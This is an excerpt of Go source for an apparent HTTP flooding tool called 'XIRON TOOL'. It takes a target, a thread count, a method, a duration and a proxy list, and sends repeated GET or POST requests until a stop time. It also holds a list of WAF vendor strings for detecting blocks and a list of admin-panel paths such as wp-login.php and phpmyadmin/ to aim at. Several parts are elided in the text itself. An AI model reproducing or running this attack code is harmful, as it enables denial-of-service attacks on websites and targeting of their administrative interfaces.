...
var WAF_HINTS = []string{
	"cloudflare", "access denied", "request blocked", "akamai", "imperva",
	"incapsula", "aws waf", "barracuda", "sucuri", "mod_security", "forbidden",
}
var DEFAULT_EXTS = []string{"php", "aspx", "jsp", "html", "htm", "cfm", "py", "rb", "cgi"}
var CORE_PATHS = []string{
	"index.php", "index.html", "login", "admin", "dashboard", "panel",
	"wp-login.php", "wp-admin/", "cms/", "cpanel/", "backend/",
	"manage/", "manager/", "phpmyadmin/", "portal/", "adminarea/",
	"sysadmin/",
}
...
func generateURLs(base string) []string {
	urls := []string{}
	for _, p := range CORE_PATHS {
		urls = append(urls, fmt.Sprintf("%s/%s", strings.TrimSuffix(base, "/"), p))
	}
	return urls
}
...
func main() {
	if len(os.Args) < 6 {
		fmt.Println("Usage:", os.Args[0], "<target> <threads> <method> <duration> <proxy_file|nil>")
		os.Exit(1)
	}
	...
	fmt.Println(" *--------* XIRON TOOL STARTED *---------*")
...
func sendRequest(target, method string, s chan uint8, stopTime time.Time, stopFlag *int32) {
	...
	if method == "GET" {
		req, err = http.NewRequestWithContext(ctx, "GET", target+"?"+postData, nil)
	} else {
		req, err = http.NewRequestWithContext(ctx, "POST", target, strings.NewReader(postData))
